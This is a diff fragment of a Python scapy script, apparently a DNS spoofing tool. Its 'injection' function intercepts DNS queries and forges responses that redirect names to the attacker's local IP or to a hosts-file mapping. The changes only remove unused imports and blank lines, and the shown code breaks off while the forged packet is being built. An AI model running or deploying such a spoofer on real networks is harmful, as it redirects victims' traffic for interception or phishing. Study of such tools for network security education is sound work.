@@ -1,13 +1,9 @@
-import sys
 import argparse
-import socket
 import netifaces
 from scapy.all import *
 from scapy.layers.inet import IP, UDP, Ether
 from scapy.layers.dns import DNS, DNSQR, DNSRR
-
 import time
-
 
 global local_ip
 global args
@@ -16,7 +12,6 @@ global hosts
 def injection(packet):
     # print("\n-----------------------------------------------------------\n", packet)
     redirect_ip = local_ip
-
     
     if (IP in packet) and (UDP in packet) and (DNS in packet) and (DNSQR in packet) and packet[DNS].qr == 0:
         
@@ -37,12 +32,9 @@ def injection(packet):
         dns_id = packet[DNS].id
         dns_qname = dns_qd.qname.decode("utf-8")[:-1]
         
-
-        
         hostname_ip = hosts.get(dns_qname)
         if hostname_ip != None:
             redirect_ip = hostname_ip
-        
         
         injected_packet =  IP(src=dest_ip, dst=src_ip)/ \
                            UDP(sport=dest_port, dport=src_port)/ \
